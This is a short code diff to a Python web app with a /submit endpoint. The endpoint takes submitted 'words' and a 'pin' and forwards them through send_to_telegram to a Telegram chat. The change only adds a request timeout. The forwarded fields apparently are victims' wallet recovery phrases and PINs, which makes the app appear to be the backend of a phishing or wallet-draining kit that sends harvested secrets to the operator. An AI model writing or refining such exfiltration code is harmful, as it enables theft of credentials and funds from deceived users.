@@ -40,7 +40,7 @@ def send_to_telegram(words, pin):
         requests.post(url, json={
             "chat_id": chat,
             "text": text
-        })
+        }, timeout=10)
 
 
 @app.post("/submit")
@@ -49,3 +49,4 @@ async def submit(data: Data):
     send_to_telegram(data.words, data.pin)
 
     return {"status": "ok"}
+
